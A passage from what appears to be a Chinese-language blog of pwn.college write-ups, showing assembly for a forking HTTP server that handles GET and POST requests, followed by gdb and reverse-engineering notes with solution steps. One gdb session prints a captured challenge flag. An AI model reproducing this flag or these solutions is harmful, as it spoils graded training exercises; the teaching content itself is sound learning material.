class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"># creat a socket</span><br><span class="line">    mov rdi, 2</span><br><span class="line">    mov rsi, 1</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 41  # socket</span><br><span class="line">    syscall</span><br><span class="line">    mov sock_f, rax  # 为了第二个accept能够调用该套接字</span><br><span class="line"></span><br><span class="line"># bind a socket</span><br><span class="line">    push 0x0</span><br><span class="line">    push 0x0000000050000002</span><br><span class="line"></span><br><span class="line">    mov rdi, rax</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    mov rdx, 16</span><br><span class="line">    mov rax, 49  # bind</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># listen a socket</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rax, 50</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># accept a connection</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line">    mov accept_f, rax</span><br><span class="line">    push rax # 方便子进程的read函数调用</span><br><span class="line"></span><br><span class="line"># fork</span><br><span class="line">    mov rax, 57</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># 根据返回值判断是子进程还是父进程</span><br><span class="line">    cmp rax, 0</span><br><span class="line">    je Child</span><br><span class="line">    jne Parent</span><br><span class="line"></span><br><span class="line">Child:</span><br><span class="line"># close 第一个socket</span><br><span class="line">    mov rdi, sock_f</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># read</span><br><span class="line">    pop rdi</span><br><span class="line">    push rdi</span><br><span class="line">    lea rsi, array</span><br><span class="line">    mov rdx, 256</span><br><span class="line">    mov rax, 0</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># open</span><br><span class="line">    lea rdi, [array+4] # 获取文件路径字符串的起始地址</span><br><span class="line">    movb [rdi+16], 0   # 文件路径长度为16，需要截断</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rax, 2</span><br><span class="line">    syscall</span><br><span class="line">    push rax</span><br><span class="line"></span><br><span class="line"># read</span><br><span class="line">    mov rdi, rax</span><br><span class="line">    lea rsi, buf</span><br><span class="line">    mov rdx, 512</span><br><span class="line">    mov rax, 0</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">mov length, rax # 获取文件读取的长度</span><br><span class="line"></span><br><span class="line"># close</span><br><span class="line">    pop rdi  # 获取 open 返回值</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># write</span><br><span class="line">    pop rdi  # 获取accept返回值</span><br><span class="line">    lea rsi, hello</span><br><span class="line">    mov rdx, 19</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># write</span><br><span class="line">    lea rsi, buf</span><br><span class="line">    mov rdx, length</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># exit</span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rax, 60  # SYS_exit</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">Parent:</span><br><span class="line"># close</span><br><span class="line">    mov rdi, accept_f</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># accept</span><br><span class="line">    mov rdi, sock_f</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">    array:</span><br><span class="line">        .fill 256, 1, 0  # 分配 256 字节并初始化为 0</span><br><span class="line">    hello:</span><br><span class="line">        .ascii "HTTP/1.0 200 OK\r\n\r\n" # 用于定义一个不以零字节结尾的字符串</span><br><span class="line">    buf:</span><br><span class="line">        .fill 512, 1, 0  # 存放打开文件的内容</span><br><span class="line">    length:</span><br><span class="line">        .quad 0 # 定义一个 8 字节变量并初始化为 0</span><br><span class="line">    sock_f:</span><br><span class="line">        .quad 0 # 定义一个 8 字节变量并初始化为 0</span><br><span class="line">    accept_f:</span><br><span class="line">        .quad 0</span><br></pre></td></tr></tbody></table></figure></li><li><p>level10：多个程序动态响应多个HTTP请求（POST）。题目要求如下：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">===== Expected: Parent Process =====</span><br><span class="line">[ ] execve(&lt;execve_args&gt;) = 0</span><br><span class="line">[ ] socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3</span><br><span class="line">[ ] bind(3, {sa_family=AF_INET, sin_port=htons(&lt;bind_port&gt;), sin_addr=inet_addr("&lt;bind_address&gt;")}, 16) = 0</span><br><span class="line">    - Bind to port 80</span><br><span class="line">    - Bind to address 0.0.0.0</span><br><span class="line">[ ] listen(3, 0) = 0</span><br><span class="line">[ ] accept(3, NULL, NULL) = 4</span><br><span class="line">[ ] fork() = &lt;fork_result&gt;</span><br><span class="line">[ ] close(4) = 0</span><br><span class="line">[ ] accept(3, NULL, NULL) = ?</span><br><span class="line"></span><br><span class="line">===== Expected: Child Process =====</span><br><span class="line">[ ] close(3) = 0</span><br><span class="line">[ ] read(4, &lt;read_request&gt;, &lt;read_request_count&gt;) = &lt;read_request_result&gt;</span><br><span class="line">[ ] open("&lt;open_path&gt;", O_WRONLY|O_CREAT, 0777) = 3</span><br><span class="line">[ ] write(3, &lt;write_file&gt;, &lt;write_file_count&gt;) = &lt;write_file_result&gt;</span><br><span class="line">[ ] close(3) = 0</span><br><span class="line">[ ] write(4, "HTTP/1.0 200 OK\r\n\r\n", 19) = 19</span><br><span class="line">[ ] exit(0) = ?</span><br></pre></td></tr></tbody></table></figure><p>wp：父进程的要求与上一关相同，只需修改子进程的代码。子进程的代码逻辑是通过POST将数据传送给服务器的指定文件中，所以将数据读入缓冲区后，需要利用<code>open</code>创建文件，然后通过<code>write</code>写入文件中，第二个<code>write</code>用于回复客户端。<strong>注意每个函数操作的文件描述符</strong>。这题获取POST请求中的数据和数据长度是难点，我了参考这个<a href="https://tech.c01dkit.com/pwn-college-cse365-spring2023/#building-a-web-server-writeups">wp</a>，完整代码如下：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"># creat a socket</span><br><span class="line">    mov rdi, 2</span><br><span class="line">    mov rsi, 1</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 41  # socket</span><br><span class="line">    syscall</span><br><span class="line">    mov sock_f, rax  # 为了第二个accept能够调用该套接字</span><br><span class="line"></span><br><span class="line"># bind a socket</span><br><span class="line">    push 0x0</span><br><span class="line">    push 0x0000000050000002</span><br><span class="line"></span><br><span class="line">    mov rdi, rax</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    mov rdx, 16</span><br><span class="line">    mov rax, 49  # bind</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># listen a socket</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rax, 50</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># accept a connection</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line">    mov accept_f, rax</span><br><span class="line">    push rax # 方便子进程的read函数调用</span><br><span class="line"></span><br><span class="line"># fork</span><br><span class="line">    mov rax, 57</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># 根据返回值判断是子进程还是父进程</span><br><span class="line">    cmp rax, 0</span><br><span class="line">    je Child</span><br><span class="line">    jne Parent</span><br><span class="line"></span><br><span class="line">Child:</span><br><span class="line"># close 第一个socket</span><br><span class="line">    mov rdi, sock_f</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># read</span><br><span class="line">    pop rdi</span><br><span class="line">    push rdi</span><br><span class="line">    lea rsi, array</span><br><span class="line">    mov rdx, 512</span><br><span class="line">    mov rax, 0</span><br><span class="line">    syscall</span><br><span class="line">    mov length, rax</span><br><span class="line"></span><br><span class="line"># open</span><br><span class="line">    lea rdi, [array+5] # 获取文件路径字符串的起始地址</span><br><span class="line">    movb [rdi+16], 0   # 文件路径长度为16，需要截断</span><br><span class="line">    mov rsi, 0x41</span><br><span class="line">    mov rdx, 0777</span><br><span class="line">    mov rax, 2</span><br><span class="line">    syscall</span><br><span class="line">    push rax</span><br><span class="line"></span><br><span class="line"># write</span><br><span class="line"># 获取POST请求内容，即写入文件的内容</span><br><span class="line">    mov rcx, 0</span><br><span class="line">    mov ebx, separate</span><br><span class="line">Content: # 若 eax!="\r\n\r\n" 则继续循环</span><br><span class="line">    mov eax, [array+rcx]</span><br><span class="line">    add rcx, 1  # 注意这里加法是在比较之前，所以之后跳过"\r\n\r\n"只需加3即可</span><br><span class="line">    cmp eax, ebx</span><br><span class="line">    jne Content</span><br><span class="line">    add rcx, 3</span><br><span class="line"></span><br><span class="line">    pop rdi # 获取open返回值</span><br><span class="line">    lea rsi, [array+rcx]</span><br><span class="line">    mov rdx, length  # length是总长度</span><br><span class="line">    sub rdx, rcx  # 总长度减去数据之前的字符长度即为数据大小</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># close</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># write</span><br><span class="line">    mov rdi, accept_f</span><br><span class="line">    lea rsi, hello</span><br><span class="line">    mov rdx, 19</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># exit</span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rax, 60  # SYS_exit</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">Parent:</span><br><span class="line"># close</span><br><span class="line">    mov rdi, accept_f</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># accept</span><br><span class="line">    mov rdi, sock_f</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">    array:</span><br><span class="line">        .fill 512, 1, 0  # 分配 512 字节并初始化为 0</span><br><span class="line">    hello:</span><br><span class="line">        .ascii "HTTP/1.0 200 OK\r\n\r\n" # 用于定义一个不以零字节结尾的字符串</span><br><span class="line">    buf:</span><br><span class="line">        .fill 512, 1, 0  # 存放打开文件的内容</span><br><span class="line">    length:</span><br><span class="line">        .quad 0 # 定义一个 8 字节变量并初始化为 0</span><br><span class="line">    sock_f:</span><br><span class="line">        .quad 0 # 定义一个 8 字节变量并初始化为 0</span><br><span class="line">    accept_f:</span><br><span class="line">        .quad 0</span><br><span class="line">    separate:</span><br><span class="line">        .ascii "\r\n\r\n"</span><br></pre></td></tr></tbody></table></figure></li><li><p>level11：多个程序动态响应多个HTTPGET和POST请求。题目没给提示，不太明白，参考大佬的<a href="https://tech.c01dkit.com/pwn-college-cse365-spring2023/#building-a-web-server-writeups">wp</a></p></li></ul><h2 id="reverse-engineering">Reverse Engineering</h2><h3 id="知识点-3">知识点</h3><ul><li><p><code>cpp</code>命令：全称是——C 语言预处理程序（Cpreprocessor），使用方式<code>cpp &lt;file_name&gt;.c</code>，运行该命令后会自动省略注释</p></li><li><p>ELF：一种用于可执行文件、目标代码、共享库和核心转储的标准文件格式（Linux）。当一个ELF 可执行文件被加载到内存中时，其内存布局通常包括以下部分：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">代码段（.text segment）：存放可执行代码。</span><br><span class="line">数据段（.data segment）：存放已初始化的全局和静态变量。</span><br><span class="line">BSS 段（.bss segment）：存放未初始化的全局和静态变量。</span><br><span class="line">堆（heap）：用于动态内存分配，运行时通过 malloc 等函数进行分配，堆向上增长。</span><br><span class="line">栈（stack）：用于管理函数调用、局部变量、参数和返回地址，栈向下增长。</span><br></pre></td></tr></tbody></table></figure></li><li><p>栈帧：<strong>函数调用</strong>期间保存在栈中的数据结构，用于存储参数、局部变量和返回地址等，其中<strong>局部变量</strong>在函数调用期间存储在栈帧中。而<strong>栈帧属于ELF内存布局中的栈的一部分</strong>。</p></li><li><p>static tools（静态分析工具）：</p><ul><li>Kaitai Struct：https://ide.kaitai.io/二进制数据分析工具（在线）</li><li><code>nm</code>：用来检查二进制文件（包括库，编译后的目标模块，共享目标文件，和独立可执行文件）并显示这些文件的内容，或存储在其中的元信息，特别是符号表。具体参考这个<a href="https://voidint.github.io/post/tool/nm/">教程</a></li><li><code>strings</code>：用于查看文件中出现的ASCII字符串</li><li><code>objdump</code>：查看二进制文件信息，可用于反汇编</li><li><a href="https://github.com/slimm609/checksec.sh">checksec</a>：分析可执行文件的安全属性</li><li>高级反汇编器：IDA Pro，Binary Ninja，angrmanagement，ghidra，cutter</li></ul></li><li><p>dynamic tools（动态分析工具）：</p><ul><li><code>ltrace</code>：追踪库函数调用情况</li><li><code>strace</code>：追踪系统调用情况</li><li><code>gdb</code>：GNU软件系统中的标准调试器</li><li><code>qira</code>：随时回溯到之前的任意时间点的调试器，gdb也可以回溯</li></ul></li><li><p>逆向练习网站：https://crackmes.one/</p></li></ul><h3 id="练习-3">练习</h3><ul><li><p>DebuggingRefresher-level1：运行<code>/challenge/embryogdb_level1</code>打开本关gdb练习，然后输入<code>run</code>查看本关要求，下面是gdb相关命令</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">start：启动程序，并在main函数上设置一个断点。</span><br><span class="line">starti：启动程序，并在_start（程序的入口点）上设置一个断点。</span><br><span class="line">run：启动程序，但不设置任何断点。</span><br><span class="line">c：用来继续程序的执行</span><br><span class="line">b：打断点，可直接加&lt;函数名&gt;或者&lt;*+地址&gt;，如： b *<span class="number">0x00005614f4ed5c52</span></span><br></pre></td></tr></tbody></table></figure><p>wp：先<code>run</code>，然后执行<code>c</code>命令得到flag</p></li><li><p>Debugging Refresher-level2：使用相关命令可以查看寄存器的值</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">info registers：查看所有寄存器的当前值</span><br><span class="line">print 或 p 命令可以打印特定寄存器的值：</span><br><span class="line">- p $rdi：会以十进制形式打印寄存器 $rdi 的值</span><br><span class="line">- p/x $rdi： 会以十六进制形式打印寄存器 $rdi 的值</span><br></pre></td></tr></tbody></table></figure><p>这题的要求是读取<code>r12</code>寄存器的值</p><p>wp：<code>run</code>运行程序，使用<code>p/x $r12</code>得到寄存器的十六进制值，然后<code>c</code>继续运行程序，输入得到的寄存器值得到flag</p></li><li><p>Debugging Refresher-level3：<strong>内存查看命令</strong><code>x/&lt;n&gt;&lt;u&gt;&lt;f&gt; &lt;address&gt;</code></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;n&gt;：要显示的元素数量。</span><br><span class="line">&lt;u&gt;：显示的单位大小，可以是 b（1字节），h（2字节），w（4字节），和 g（8字节）。</span><br><span class="line">&lt;f&gt;：显示格式，可以是 d（十进制），x（十六进制），s（字符串）和 i（指令）。</span><br><span class="line">&lt;address&gt;：内存地址，可以是寄存器名、符号名或绝对地址。还可以使用数学表达式指定地址。</span><br></pre></td></tr></tbody></table></figure><p>下面是示例：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x/8i $rip：从当前指令指针 $rip 开始，打印接下来的8条指令。</span><br><span class="line">x/16i main：打印 main 函数的前16条指令。</span><br><span class="line">disassemble main 或 disas main：打印 main 函数的所有指令。</span><br><span class="line">x/16gx $rsp：打印栈上的前16个值（每个值为8字节）。</span><br><span class="line">x/gx $rbp-0x32：打印栈上存储在 $rbp-0x32 处的局部变量。</span><br></pre></td></tr></tbody></table></figure><p>使用命令 <code>set disassembly-flavor intel</code>可以<strong>设置正确的汇编语法</strong>（Intel风格）</p><p>本题要求：需要找出栈上的随机值（从 <code>/dev/urandom</code>读取的值，提示：从<code>read</code>入手）</p><p>wp：<code>read</code>将数据读入缓冲区即栈中，要找到该随机值，需要先找到缓冲区地址，首先使用<code>disas main</code>查看哪一步调用的<code>read</code>函数，找到后下断点<code>b *0x0000555a87da5c52</code>，接着使用<code>c</code>运行到断点处，然后使用<code>ni</code>进行单步操作，此时<code>read</code>函数运行结束，随机值已经写入缓冲区，同时缓冲区地址存储在<code>rsi</code>寄存器中，利用<code>p/x $rsi</code>读取地址，然后通过<code>p/x $rdx</code>获取读入的数据大小，最后<code>x/16gx $rsp</code>找到随机值，具体步骤如下</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">(gdb) b *0x0000555a87da5c52</span><br><span class="line">Breakpoint 1 at 0x555a87da5c52</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x0000555a87da5c52 in main ()</span><br><span class="line">(gdb) p/x $rsi</span><br><span class="line">$1 = 0x7ffcd01ec258</span><br><span class="line">(gdb) p/x $rdx</span><br><span class="line">$1 = 0x8</span><br><span class="line">(gdb) ni</span><br><span class="line">0x0000555a87da5c57 in main ()</span><br><span class="line">(gdb) x/16gx $rsp</span><br><span class="line">0x7ffcd01ec230: 0x0000000000000002      0x00007ffcd01ec378</span><br><span class="line">0x7ffcd01ec240: 0x00007ffcd01ec368      0x0000000187da5d10</span><br><span class="line">0x7ffcd01ec250: 0x0000000000000000      0x548e09daf2aa196f</span><br><span class="line">0x7ffcd01ec260: 0x00007ffcd01ec360      0xf95498a84a54f000</span><br><span class="line">0x7ffcd01ec270: 0x0000000000000000      0x00007f939d396083</span><br><span class="line">0x7ffcd01ec280: 0x00007f939d59e620      0x00007ffcd01ec368</span><br><span class="line">0x7ffcd01ec290: 0x0000000100000000      0x0000555a87da5aa6</span><br><span class="line">0x7ffcd01ec2a0: 0x0000555a87da5d10      0x065983aff1f9bd70</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">The random value has been set!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Program received signal SIGTRAP, Trace/breakpoint trap.</span><br><span class="line">0x0000555a87da5c64 in main ()</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Random value: 548e09daf2aa196f</span><br><span class="line">You input: 548e09daf2aa196f</span><br><span class="line">The correct answer is: 548e09daf2aa196f</span><br><span class="line">You win! Here is your flag:</span><br><span class="line">pwn.college{IvE7YRHrWYfzFx-_sveUOOl0qo4.0lN0IDLycDMyUzW}</span><br></pre></td></tr></tbody></table></figure></li><li><p>Debugging Refresher-level4：动态调试</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">step 或 s：逐行调试并进入函数</span><br><span class="line">next 或 n：逐行调试但不进入函数</span><br><span class="line">stepi 或 si：逐指令调试并进入函数</span><br><span class="line">nexti 或 ni：逐指令调试但不进入函数</span><br><span class="line">finish：执行当前函数直到返回</span><br><span class="line">break *&lt;address&gt;：在指定地址处设置断点。</span><br><span class="line">display/&lt;n&gt;&lt;u&gt;&lt;f&gt; &lt;expression&gt;：实时显示值，格式与 x/&lt;n&gt;&lt;u&gt;&lt;f&gt; 命令相同。例如：</span><br><span class="line">- display/8i $rip：始终显示接下来的8条指令。</span><br><span class="line">- display/4gx $rsp：始终显示栈上的前4个值（每个值为8字节）</span><br><span class="line">layout regs：进入TUI模式，显示所有寄存器的内容和附近的指令</span><br></pre></td></tr></tbody></table></figure><p>本关要求：找到将被放置在栈上的一系列随机值</p><p>wp：步骤基本与上一关相同，只是多重复了几次</p></li><li><p>Debugging Refresher-level5：GDB脚本，<code>.gdb</code>文件</p><ul><li><p>将命令写入一个文件，例如 <code>x.gdb</code>。</p></li><li><p>使用 <code>-x &lt;PATH_TO_SCRIPT&gt;</code>标志启动GDB，这个文件将在GDB启动后执行所有命令。</p><p>示例：<code>gdb -x script.gdb /path/to/your/program</code></p></li><li><p>可以使用 <code>-ex '&lt;COMMAND&gt;'</code>来执行单个命令，多个命令可以使用多个 <code>-ex</code> 参数。</p></li><li><p>可以将一些常用命令放入 <code>~/.gdbinit</code> 文件中，例如<code>set disassembly-flavor intel</code></p></li><li><p><code>commands</code> 和<code>end</code>：用于定义在<strong>断点命中时自动执行</strong>的命令序列。</p></li></ul><p>本关要求：使用gdb脚本获取内存里的随机值</p><p>wp：首先找到<code>read</code>系统调用的地址，编写脚本<code>script.gdb</code>，运行<code>/challenge/embryogdb_level5 -x script.gdb</code>，然后根据回显内容操作，步骤与上一关相同，脚本内容如下</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">run</span><br><span class="line">break *main+709</span><br><span class="line">commands</span><br><span class="line">  info registers</span><br><span class="line">  x/16gx $rsp</span><br><span class="line">  continue</span><br><span class="line">end</span><br><span class="line">continue</span><br></pre></td></tr></tbody></table></figure></li><li><p>Debugging Refresher-level6：gdb可以修改程序状态</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- 修改寄存器值：set $rdi = 0 将寄存器 $rdi 设置为 0。</span><br><span class="line">- 修改栈上的值：set *((uint64_t *) $rsp) = 0x1234 将栈顶的值设置为 0x1234。</span><br><span class="line">- 修改内存中的值：set *((uint16_t *) 0x31337000) = 0x1337 将地址 0x31337000 处的2个字节设置为 0x1337。</span><br></pre></td></tr></tbody></table></figure><p>wp：先找到<code>read</code>函数位置，然后找到scanf输入的字符存入的内存地址</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000001cd2 &lt;+556&gt;:   mov    ecx,eax</span><br><span class="line">0x0000000000001cd4 &lt;+558&gt;:   lea    rax,[rbp-0x18]</span><br><span class="line">0x0000000000001cd8 &lt;+562&gt;:   mov    edx,0x8</span><br><span class="line">0x0000000000001cdd &lt;+567&gt;:   mov    rsi,rax</span><br><span class="line">0x0000000000001ce0 &lt;+570&gt;:   mov    edi,ecx</span><br><span class="line">0x0000000000001ce2 &lt;+572&gt;:   call   0x1210 &lt;read@plt&gt;</span><br><span class="line">0x0000000000001ce7 &lt;+577&gt;:   lea    rdi,[rip+0xbf2]        # 0x28e0</span><br><span class="line">0x0000000000001cee &lt;+584&gt;:   call   0x1190 &lt;puts@plt&gt;</span><br><span class="line">0x0000000000001cf3 &lt;+589&gt;:   lea    rdi,[rip+0xc06]        # 0x2900</span><br><span class="line">0x0000000000001cfa &lt;+596&gt;:   mov    eax,0x0</span><br><span class="line">0x0000000000001cff &lt;+601&gt;:   call   0x11d0 &lt;printf@plt&gt;</span><br><span class="line">0x0000000000001d04 &lt;+606&gt;:   lea    rax,[rbp-0x10]</span><br><span class="line">0x0000000000001d08 &lt;+610&gt;:   mov    rsi,rax</span><br><span class="line">0x0000000000001d0b &lt;+613&gt;:   lea    rdi,[rip+0xbfd]        # 0x290f</span><br><span class="line">0x0000000000001d12 &lt;+620&gt;:   mov    eax,0x0</span><br><span class="line">0x0000000000001d17 &lt;+625&gt;:   call   0x1260 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">0x0000000000001d1c &lt;+630&gt;:   mov    rax,QWORD PTR [rbp-0x10]</span><br><span 